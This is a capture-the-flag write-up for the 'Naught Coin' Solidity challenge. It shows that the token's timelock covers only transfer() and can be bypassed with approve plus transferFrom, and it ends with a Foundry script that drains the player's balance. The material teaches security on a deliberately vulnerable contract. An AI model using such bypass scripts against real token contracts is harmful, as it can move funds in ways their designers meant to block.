# Naught coin   
The objective of this challenge is to reduce our token balance to 0. However, there's a modifier that prevents us from transferring tokens until the `timeLock` has passed, and the `timeLock` is set to 10 years!:
```solidity
uint256 public timeLock = block.timestamp + 10 * 365 days;
```
Looking closer at the modifier, we can see that it checks if `msg.sender == player`. If they are equal, the `require` statement that checks if the `timeLock` has passed will be executed. However, if `msg.sender` and `player` are not equal, this require statement won't be executed. This means we can bypass the restriction by using a smart contract. However, as we'll see, it won't be necessary to go down that route.
```solidity
// Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
```
But now, how can we transfer all of our tokens? If we call transfer from a smart contract, we won't be able to transfer anything because the owner of the tokens is our wallet.
To solve this, we need to check the [OpenZeppelin](https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts) codebase, as suggested in the challenge description. There are other functions we can use to transfer tokens.

The functions we need are:

[`approve(address spender, uint256 value)`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/3bdc3a35c504396c7227cecc32f50ae07da7e5c1/contracts/token/ERC20/ERC20.sol#L127): This function allows the owner to give another address (the spender) the ability to transfer tokens on their behalf.
[`transferFrom(address from, address to, uint256 value)`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/3bdc3a35c504396c7227cecc32f50ae07da7e5c1/contracts/token/ERC20/ERC20.sol#L149): This function allows the approved spender to transfer tokens from the owner's address to another address.

Even if we are the owner and want to use transferFrom, we still need to approve ourselves first. After obtaining approval, we can use transferFrom to move the tokens.

To solve this challenge, I created a small script:
 
```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";

contract SolvingScript is Script {
    address victim = ; /* Your instance address */

    function run() public {
        vm.startBroadcast();

        // Approving ourselves to spend all tokens
        victim.call(abi.encodeWithSignature("approve(address,uint256)", msg.sender, type(uint256).max));

        // Getting our balance
        (, bytes memory data) = victim.staticcall(abi.encodeWithSignature("balanceOf(address)", msg.sender));
        uint256 balance = abi.decode(data, (uint256));

        // Transferring all tokens to the victim contract
        victim.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", msg.sender, victim, balance));
        vm.stopBroadcast();
    }
}
```